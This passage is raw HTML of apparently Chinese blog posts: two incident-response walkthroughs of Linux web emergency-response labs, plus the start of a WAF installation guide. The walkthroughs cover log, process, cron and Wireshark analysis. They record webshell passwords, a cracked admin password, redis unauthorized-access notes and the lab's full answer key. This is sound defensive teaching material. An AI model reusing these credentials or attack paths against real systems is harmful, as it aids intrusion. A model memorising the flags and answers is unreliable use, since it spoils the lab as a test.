的密码被进行了更改，并且有一个可疑的<code>wp</code>文件被执行，后面是我的排查操作</p><p>那么针对flag3那个用户有没有创建成功，再看一下<code>/etc/passwd</code>文件</p><p><img src="/img/Emergency-Linux-web2/image-20240322140038907.png" alt="image-20240322140038907"></p><p>确实不存在flag3用户，只存在www和mysql 的普通用户</p><h1 id="四、端口、进程排查"><a href="#四、端口、进程排查" class="headerlink" title="四、端口、进程排查"></a>四、端口、进程排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322140142066.png" alt="image-20240322140142066"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pa -aux  #查看进程</span><br><span class="line">top -c -o %CPU     #实时查看高CPU进程</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322140225599.png" alt="image-20240322140225599"></p><p><img src="/img/Emergency-Linux-web2/image-20240322140307183.png" alt="image-20240322140307183"></p><h1 id="五、开机启动项排查"><a href="#五、开机启动项排查" class="headerlink" title="五、开机启动项排查"></a>五、开机启动项排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/profile</span><br><span class="line">~/.bashrc</span><br><span class="line">等</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322140615795.png" alt="image-20240322140615795"></p><p><img src="/img/Emergency-Linux-web2/image-20240322163635815.png" alt="image-20240322163635815"></p><p>在<code>/etc/profile</code>文件中发现<code>flag3=&quot;flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;&quot;</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322191053732.png" alt="image-20240322191053732"></p><h1 id="六、定时任务排查"><a href="#六、定时任务排查" class="headerlink" title="六、定时任务排查"></a>六、定时任务排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">cat /var/spool/cron/*</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/cron.d/*</span><br><span class="line">cat /etc/cron.daiy/*</span><br><span class="line">cat /etc/cron.weekly/*</span><br><span class="line">cat /etc/cron.monthly/*</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322163802313.png" alt="image-20240322163802313"></p><h1 id="七、日志排查"><a href="#七、日志排查" class="headerlink" title="七、日志排查"></a>七、日志排查</h1><h2 id="1、系统安全日志审计"><a href="#1、系统安全日志审计" class="headerlink" title="1、系统安全日志审计"></a>1、系统安全日志审计</h2><p>安全日志文件存放路径：<code>/var/log/secure</code>，是ssh登陆成功与否的一个安全日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Failed&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr   #统计IP爆破次数</span><br><span class="line">cat secure | grep &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322170358123.png" alt="image-20240322170358123"></p><p>发现IP<code>192.168.20.1</code>这个IP 通过密码认证进行了三次登陆</p><h2 id="2、web日志审计"><a href="#2、web日志审计" class="headerlink" title="2、web日志审计"></a>2、web日志审计</h2><p>在之前的排查中知道该机器配置有宝塔，即存在web服务，查看web 日志，路径：<code>/www/wwwlogs/access.log</code></p><p>依然利用<code>more</code>命令进行查看</p><p><img src="/img/Emergency-Linux-web2/image-20240322171405425.png" alt="image-20240322171405425"></p><p>但是这样太多太杂不好分析，我们在靶机上利用python2 快速开启一个http服务，将日志文件下载到本地进行分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">python --version</span><br><span class="line">ip a</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322172153579.png" alt="image-20240322172153579"></p><p>我们重点分析<code>access.log</code>文件：</p><p><img src="/img/Emergency-Linux-web2/image-20240322172833614.png" alt="image-20240322172833614"></p><p>之后用在线日志分析网站进行逐一分析</p><p><img src="/img/Emergency-Linux-web2/image-20240322172941689.png" alt="image-20240322172941689"></p><p>开头是127.0.0.1的IP访问，时间在3月7日，到49条日志开始，出现了<code>192.168.20.1</code>这个局域网IP 的操作，开始时间在<code>12:05:16</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322174608055.png" alt="image-20240322174608055"></p><p>也是对<code>/phpmyadmin</code>进行访问，持续到162条日志，但是时间全部在3月7日进行的，最后时间停留在<code>12:30:04</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322173043519.png" alt="image-20240322173043519"></p><p>从163条日志开始，时间来到3月20日，IP是本地的127.0.0.1，在<code>phpmyadmin</code>中对数据库进行了很多的操作，一直持续到日志结尾</p><p><img src="/img/Emergency-Linux-web2/image-20240322174505560.png" alt="image-20240322174505560"></p><p>这个日志很奇怪，在异常文件排查过程中，ssh公钥文件是在3月20日<code>10:30:24</code>被修改的，而在日志中<code>192.168.20.1</code>只在3月7日出现过</p><p>使用360星图也未发现有攻击行为，只做了一些简单的流量分析</p><p><img src="/img/Emergency-Linux-web2/image-20240322175203210.png" alt="image-20240322175203210"></p><h1 id="八、异常文件排查"><a href="#八、异常文件排查" class="headerlink" title="八、异常文件排查"></a>八、异常文件排查</h1><h2 id="1、tmp临时文件排查"><a href="#1、tmp临时文件排查" class="headerlink" title="1、tmp临时文件排查"></a>1、tmp临时文件排查</h2><p>正常文件，有好多session文件</p><p><img src="/img/Emergency-Linux-web2/image-20240322163935584.png" alt="image-20240322163935584"></p><h2 id="2、ssh目录排查"><a href="#2、ssh目录排查" class="headerlink" title="2、ssh目录排查"></a>2、ssh目录排查</h2><p><img src="/img/Emergency-Linux-web2/image-20240322164150956.png" alt="image-20240322164150956"></p><p>root的<code>.ssh</code>文件夹下存在公钥，其内容在3月20日<code>10:30:24</code>被修改，其权限在3月22日<code>21:09:44</code>被修改</p><h2 id="3、root家目录排查"><a href="#3、root家目录排查" class="headerlink" title="3、root家目录排查"></a>3、root家目录排查</h2><p><img src="/img/Emergency-Linux-web2/image-20240322191230933.png" alt="image-20240322191230933"></p><p>发现之前历史命令中排查到的wp 可执行文件，以及存在一个<code>.pcapng</code>文件，有关这个<code>.pcapng</code>文件，属于是流量包文件，通过这个文件，我们可以追踪跟该机器交互的流量数据，从而更好的进行排查</p><h2 id="4、-api-文件夹排查"><a href="#4、-api-文件夹排查" class="headerlink" title="4、.api 文件夹排查"></a>4、.api 文件夹排查</h2><p>之前在历史命令中看到有对<code>.api</code>文件夹做过手脚，我们看一下</p><p><code>api</code>文件夹和<code>.api</code>文件的内容相同，大小也相同，用<code>diff</code>命令进行比对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240323154529579.png" alt="image-20240323154529579"></p><p>运气不错，第一个文件就比对出来了差异，找到了隐藏的<code>$flag2 = &quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;;</code></p><p>而其他文件都是一模一样，并无其他隐藏内容</p><p><img src="/img/Emergency-Linux-web2/image-20240323154950942.png" alt="image-20240323154950942"></p><h2 id="5、wp-文件"><a href="#5、wp-文件" class="headerlink" title="5、wp 文件"></a>5、wp 文件</h2><p>在历史命令中，该wp 文件是由<code>go_build_untitled.exe</code>的一个文件改名而来，go_build 像是由go 语言编译而来</p><p><img src="/img/Emergency-Linux-web2/image-20240322192037606.png" alt="image-20240322192037606"></p><p>该文件是3月20日<code>15:34:04</code>的时间被修改，这个时间可能是黑客进行重命名的时间点，那这个文件是干嘛的，尝试执行下<img src="/img/Emergency-Linux-web2/image-20240322192532734.png" alt="image-20240322192532734"></p><p>我擦，原来是题解，搞错了搞错了</p><h2 id="5、-pcapng文件流量分析"><a href="#5、-pcapng文件流量分析" class="headerlink" title="5、.pcapng文件流量分析"></a>5、.pcapng文件流量分析</h2><p>那我们把目光放在这个啥.pcapng 流量包文件上，将该文件利用python2开启一个http服务，传到本地，需要关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">python --version</span><br><span class="line">ip a</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322193011749.png" alt="image-20240322193011749"></p><p>原来名字是<code>数据包1.pcapng</code>，那么是否存在其他 .pcapng 文件呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.pcapng 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322193131851.png" alt="image-20240322193131851"></p><p>不存在其他的流量包文件了，我们用<code>Wireshark</code>工具打开该数据包，成功打开（有关WireShark 的简单使用：<a href="/2024/03/01/Blue-Team-Packet-Sniffing-WireShark/" title="【流量分析】流量抓包工具WireShark的基本使用">【流量分析】流量抓包工具WireShark的基本使用</a>）</p><p><img src="/img/Emergency-Linux-web2/image-20240322193324754.png" alt="image-20240322193324754"></p><p>在之前的排查过程中，知道<code>192.168.20.1</code>这个IP出现过，现在看来确定是恶意IP</p><p><img src="/img/Emergency-Linux-web2/image-20240322194206533.png" alt="image-20240322194206533"></p><p>可以在视图中将时间调整为年月日时间的形式，并进行<code>http</code>和源IP<code>ip.src == 192.168.20.1</code>的过滤，发现黑客GET访问过<code>flag1</code>，追踪HTTP流，发现<code>flag1&#123;Network@_2020_Hack&#125;</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322194559969.png" alt="image-20240322194559969"></p><p>再一步步进行排查，黑客对<code>index.php</code>文件进行了多次访问，不点不知道，一点吓一跳</p><p><img src="/img/Emergency-Linux-web2/image-20240322195313788.png" alt="image-20240322195313788"></p><p>这不是妥妥的<code>webshell管理工具蚁剑</code>的流量特征，webshell木马的密码是<code>Network2020</code>，通过HTTP追踪，一步步查看黑客通过蚁剑都做过哪些事</p><p><img src="/img/Emergency-Linux-web2/image-20240322200419738.png" alt="image-20240322200419738"></p><p>可以看到，在3月20日<code>14:33:35</code>的时候，<code>pe9.sql</code>文件依然是存在的，那么我们在历史命令中排查的时候，发现有人通过命令将该文件删除了</p><p><img src="/img/Emergency-Linux-web2/image-20240322201407323.png" alt="image-20240322201407323"></p><p>在<code>14:37:24</code>的时候发现新增了<code>shell.php</code>文件</p><p><img src="/img/Emergency-Linux-web2/image-20240322201526755.png" alt="image-20240322201526755"></p><p>在<code>14:37:43</code>的时候发现新增<code>version2.php</code>文件</p><p><img src="/img/Emergency-Linux-web2/image-20240322201714475.png" alt="image-20240322201714475"></p><p>这里，是一个PHP冰蝎马的内容，显示默认密码<code>rebeyond</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322202040481.png" alt="image-20240322202040481"></p><p>在后续中全部是对<code>version2.php</code>文件的访问，那么这里，推测<code>version2.php</code>是冰蝎马</p><p><img src="/img/Emergency-Linux-web2/image-20240322202232074.png" alt="image-20240322202232074"></p><p>确实是冰蝎马的流量特征，<code>version2.php</code>确认是后面黑客上传的木马文件，不管是请求包还是相应包都是加密传输</p><p>黑客对该文件的访问持续到<code>14:40:32</code>，感觉这里很迷，因为结合在账户安全中查看的<code>last</code>命令 ，恶意IP在<code>14:30</code>和<code>15:04</code>的时候分别进行过登陆。至于冰蝎流量解密，本人水平有限，尝试解密失败，后面便不在追究，如果哪位师傅解密成功，还望告知，本人感激不尽！</p><p>后面没有了一点线索，还是把目光放在了流量包上，看到除了http流量，还存在许多ssh 流量，丢，这思路不就打开了！我说这个靶场怎么奇奇怪怪的，原来这个靶场考察并不是追踪溯源入侵的整个流程，重点在流量这块。</p><p>我们知道，在wireshark 中解密ssh 流量需要用到ssh 的私钥，而黑客应该是通过公钥进行的登陆，那么私钥怎么弄？</p><p>我们把<code>id_ed25519.pub</code>移走、留下公钥，用私钥尝试ssh 登陆，成功，说明该私钥可以登陆成功</p><p><img src="/img/Emergency-Linux-web2/image-20240323122229620.png" alt="image-20240323122229620"></p><p>我们把这个私钥下载下来添加到<code>wireshark</code>中：在【编辑】—【首选项】—【Protocols】—【ssh】</p><p><img src="/img/Emergency-Linux-web2/image-20240323122936704.png" alt="image-20240323122936704"></p><p>我了个大豆，这样不行，ssh流量依然是加密状态，咳咳，这里就研究到这里，有师傅能解密的还望告知，本人感激不尽！</p><h1 id="九、命令替换排查"><a href="#九、命令替换排查" class="headerlink" title="九、命令替换排查"></a>九、命令替换排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">rpm -Vf /usr/sbin/* &gt; 1.txt      #由于环境限制，我们先把执行结果保存下来再进行查看</span><br><span class="line">cat 1.txt | more</span><br><span class="line"></span><br><span class="line">#S 关键字代表文件大小发生了变化</span><br><span class="line">#5 关键字代表文件的 md5 值发生了变化</span><br><span class="line">#T 代表文件时间发生了变化</span><br></pre></td></tr></table></figure><p>这里的话，有几个是是存在改变的文件，但是并非后门这种</p><p><img src="/img/Emergency-Linux-web2/image-20240323161737232.png" alt="image-20240323161737232"></p><h1 id="十、被修改的密码"><a href="#十、被修改的密码" class="headerlink" title="十、被修改的密码"></a>十、被修改的密码</h1><p>重新看了一下<code>/etc/shadow</code>，发现除了www用户还存在mysql 用户，再联想到之前web日志中的phpmyadmin的访问，猜测密码会不会藏在数据库中</p><p><img src="/img/Emergency-Linux-web2/image-20240323163717316.png" alt="image-20240323163717316"></p><p>在数据库的配置文件<code>lib/config.inc.php</code>文件中找到数据库的账号密码</p><p><img src="/img/Emergency-Linux-web2/image-20240323164407899.png" alt="image-20240323164407899"></p><p>这里的话，我们到本地的机器上进行远程连接</p><p><img src="/img/Emergency-Linux-web2/image-20240323164658694.png" alt="image-20240323164658694"></p><p>连接成功，只存在两个数据库，一路向下就好了，先查看一下<code>x2_user_group</code>的用户组表，管理员的用户组ID是1</p><p><img src="/img/Emergency-Linux-web2/image-20240323165225766.png" alt="image-20240323165225766"></p><p>再查看<code>x2_user</code>表的内容，但是太多了，我们先查看都有哪些字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;x2_user&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240323164949448.png" alt="image-20240323164949448"></p><p>有好多好多，看不过来，换了一个MySQL图形管理来查看</p><p><img src="/img/Emergency-Linux-web2/image-20240323165927883.png" alt="image-20240323165927883"></p><p>可以看到这个<code>peadmin</code>用户的<code>usergroupid</code>值为1，那么该用户大概率是管理员，对他的密码进行解密</p><img src="/img/Emergency-Linux-web2/image-20240323170427835.png" alt="image-20240323170427835" style="zoom:150%;" /><p>成功获得明文密码：<code>Network@2020</code></p><h1 id="十一、通关密码"><a href="#十一、通关密码" class="headerlink" title="十一、通关密码"></a>十一、通关密码</h1><p><img src="/img/Emergency-Linux-web2/image-20240323170858240.png" alt="image-20240323170858240"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1,提交攻击者IP</span><br><span class="line">192.168.20.1</span><br><span class="line"></span><br><span class="line">2,提交攻击者修改的管理员密码(明文)</span><br><span class="line">Network@2020</span><br><span class="line"></span><br><span class="line">3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg)</span><br><span class="line">index.php?user-app-register</span><br><span class="line"></span><br><span class="line">3,提交Webshell连接密码</span><br><span class="line">Network2020</span><br><span class="line"></span><br><span class="line">4,提交数据包的flag1</span><br><span class="line">flag1&#123;Network@_2020_Hack&#125;</span><br><span class="line"></span><br><span class="line">5,提交攻击者使用的后续上传的木马文件名称</span><br><span class="line">version2.php</span><br><span class="line"></span><br><span class="line">6,提交攻击者隐藏的flag2</span><br><span class="line">$flag2 = &quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;;</span><br><span class="line"></span><br><span class="line">7,提交攻击者隐藏的flag3</span><br><span class="line">flag3=&quot;flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】知攻善防Linux Web1靶场入侵排查</title>
      <link href="/2024/03/21/Emergency-Linux-web1/"/>
      <url>/2024/03/21/Emergency-Linux-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="知攻善防Linux-Web1靶场入侵排查"><a href="#知攻善防Linux-Web1靶场入侵排查" class="headerlink" title="知攻善防Linux Web1靶场入侵排查"></a>知攻善防Linux Web1靶场入侵排查</h1><p><strong>前景需要：</strong>小王急匆匆地找到小张，小王说”李哥，我dev服务器被黑了”,快救救我！！</p><p>挑战内容：</p><p>黑客的IP地址</p><p>遗留下的三个flag</p><h1 id="一、账户安全"><a href="#一、账户安全" class="headerlink" title="一、账户安全"></a>一、账户安全</h1><p>检查<code>/etc/passwd</code>和<code>/etc/shadow</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep -v nologin      #查看可以登陆的用户</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow  #查看可以远程登陆的用户</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320115023026.png" alt="image-20240320115023026"></p><p>正常，只存在root和一个普通用户<code>defend</code></p><h1 id="二、历史命令排查"><a href="#二、历史命令排查" class="headerlink" title="二、历史命令排查"></a>二、历史命令排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">history          #查看root历史命令</span><br><span class="line">cat /home/defend/.bash_history       #查看普通用户defend 的历史命令</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320115445035.png" alt="image-20240320115445035"></p><p>在root 中排查到了相当可疑的操作，发现了<code>flag&#123;thisismybaby&#125;</code>，并发现了对<code>/etc/rc.d/rc.local</code>开机启动文件编辑的可疑行为，同小王商议过后，一致认为属于黑客的操作行为</p><p>查看该文件的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320120839955.png" alt="image-20240320120839955"></p><p>除发现<code>flag&#123;kfcvme50&#125;</code>之外，还发现了可疑命令<code>touch /var/lock/subsys/local</code>，创建了一个<code>local</code>文件</p><p>奇怪的是，该文件没有任何内容</p><p><img src="/img/Emergency-Linux-web1/image-20240320121043191.png" alt="image-20240320121043191"></p><h1 id="三、端口、进程排查"><a href="#三、端口、进程排查" class="headerlink" title="三、端口、进程排查"></a>三、端口、进程排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320121424436.png" alt="image-20240320121424436"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -aux  #查看进程</span><br><span class="line">top -c -o %CPU     #实时查看高CPU进程</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321131151005.png" alt="image-20240321131151005"></p><h1 id="四、开机启动项排查"><a href="#四、开机启动项排查" class="headerlink" title="四、开机启动项排查"></a>四、开机启动项排查</h1><p>这里又转回来了，之前排查过这里</p><p><img src="/img/Emergency-Linux-web1/image-20240320121716236.png" alt="image-20240320121716236"></p><h1 id="五、定时任务排查"><a href="#五、定时任务排查" class="headerlink" title="五、定时任务排查"></a>五、定时任务排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alsh /var/spool/cron/</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320121941529.png" alt="image-20240320121941529"></p><h1 id="六、异常文件排查"><a href="#六、异常文件排查" class="headerlink" title="六、异常文件排查"></a>六、异常文件排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如/tmp目录下的隐藏文件</span><br><span class="line">ssh密钥等</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321134447424.png" alt="image-20240321134447424"></p><p><code>/tmp</code>下未发现敏感文件</p><p>发现root 的.ssh下存在<code>authorized_keys</code>公钥</p><p><img src="/img/Emergency-Linux-web1/image-20240321134537128.png" alt="image-20240321134537128"></p><p>检查改动时间，发现是3月18日<code>20:22:39</code>的时间被改动</p><h1 id="七、日志排查"><a href="#七、日志排查" class="headerlink" title="七、日志排查"></a>七、日志排查</h1><p>安全日志文件存放路径：<code>/var/log/secure</code>，是ssh登陆成功与否的一个安全日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Accepted&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr   #统计IP爆破次数</span><br><span class="line">cat secure | grep &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321124831028.png" alt="image-20240321124831028"></p><p>可疑IP<code>192.168.75.129</code>对root用户进行了登陆，其中91次失败，1次成功，我们针对91次登陆失败的时间再进行一个排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Failed password for root&quot; | awk &#x27;&#123;print $1,$2,$3,$11&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321125536678.png" alt="image-20240321125536678"></p><p>从三月18日<code>19:29:43</code>持续到<code>19:29:51</code>，8秒钟之内失败次数91，判定为ssh爆破行为</p><p>再查看登陆成功的时间，在<code>20:23:07</code>，但是当我们查询密码登陆成功的日志却没有记录</p><p><img src="/img/Emergency-Linux-web1/image-20240321141454943.png" alt="image-20240321141454943"></p><p>在<code>last</code>命令下，也能看到该IP 的最后一次登陆时间，该IP用虚拟终端进行了远程登陆，持续时间2分钟</p><p><img src="/img/Emergency-Linux-web1/image-20240321130543954.png" alt="image-20240321130543954"></p><h1 id="八、命令替换检查"><a href="#八、命令替换检查" class="headerlink" title="八、命令替换检查"></a>八、命令替换检查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">rpm -Vf /usr/bin/*</span><br><span class="line"></span><br><span class="line">//结果说明</span><br><span class="line">#S 关键字代表文件大小发生了变化</span><br><span class="line">#5 关键字代表文件的 md5 值发生了变化</span><br><span class="line">#T 代表文件时间发生了变化</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321132650212.png" alt="image-20240321132650212"></p><p><code>/etc/rc.d/rc.local</code>之前已经做过排查，那么这里又出现了<code>/etc/redis.conf</code>文件，这个文件是redis 的配置文件，这个<code>redis.conf</code>应该是被人动了手脚，简单查看下，发现第三个<code>flag&#123;P@ssW0rd_redis&#125;</code></p><p><img src="/img/Emergency-Linux-web1/image-20240321144357100.png" alt="image-20240321144357100"></p><p>查看是否存在redis 未授权</p><p><img src="/img/Emergency-Linux-web1/image-20240321132912907.png" alt="image-20240321132912907"></p><p>好好好，redis 未授权访问的条件全部满足。那么查看一下该文件最新的改动时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /etc/redis.conf </span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321133049257.png" alt="image-20240321133049257"></p><p>三月18日的<code>19:53:13</code>，这就很奇怪了，因为在日志排查中，我们知道恶意IP远程登陆的时间在<code>20:23:07</code>，小王这会儿买辣条去了，等他回来问问他，我们接着往下排查。</p><p>查找下redis 的日志文件相关位置<img src="/img/Emergency-Linux-web1/image-20240321140436679.png" alt="image-20240321140436679"></p><p>看日志文件内容并筛选下恶意IP<code>192.168.75.129</code><img src="/img/Emergency-Linux-web1/image-20240321140549510.png" alt="image-20240321140549510"></p><p>该恶意IP从三月18日<code>19:27:57</code>到<code>20:21:58</code>一直对redis 服务发起访问，我们知道，一个redis 未授权访问的危害是相当巨大的，可以直接植入病毒木马等文件</p><h1 id="九、溯源追踪"><a href="#九、溯源追踪" class="headerlink" title="九、溯源追踪"></a>九、溯源追踪</h1><p>我们通过对linux登录日志分析，黑客从三月18日<code>19:29:43</code>开始进行了ssh爆破行为，持续到<code>19:29:51</code></p><p>通过redis 日志分析，黑客从三月18日<code>19:27:57</code>通过redis 未授权访问持续到<code>20:21:58</code></p><p>在异常文件中发现，root账户下的<code>authorized_keys</code>公钥是3月18日<code>20:22:39</code>的时间被改动</p><p>在<code>20:23:07</code>，黑客通过ssh私钥通过远程虚拟终端登陆，持续时间两分钟</p><p>最后，黑客通过对开机启动文件<code>/etc/rc.d/rc.local</code>做了后门维持</p>]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【WAF防火墙】雷池WAF防火墙安装和使用</title>
      <link href="/2024/03/15/Blue-Team-SafeLine-LeichiWAF/"/>
      <url>/2024/03/15/Blue-Team-SafeLine-LeichiWAF/</url>
      
        <content type="html"><![CDATA[<h1 id="雷池WAF防火墙的安装和使用"><a href="#雷池WAF防火墙的安装和使用" class="headerlink" title="雷池WAF防火墙的安装和使用"></a>雷池WAF防火墙的安装和使用</h1><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><h2 id="1、Docker-环境"><a href="#1、Docker-环境" class="headerlink" title="1、Docker 环境"></a>1、Docker 环境</h2><p>卸载旧版的docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">               docker-client \</span><br><span class="line">               docker-client-latest \</span><br><span class="line">               docker-common \</span><br><span class="line">               docker-latest \</span><br><span class="line">               docker-latest-logrotate \</span><br><span class="line">               docker-logrotate \</span><br><span class="line">               docker-engine</span><br></pre></td></tr></table></figure><p>安装依赖包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils \</span><br><span class="line">   device-mapper-persistent-data \</span><br><span class="line">   lvm2</span><br></pre></td></tr></table></figure><p>设置docker 仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo 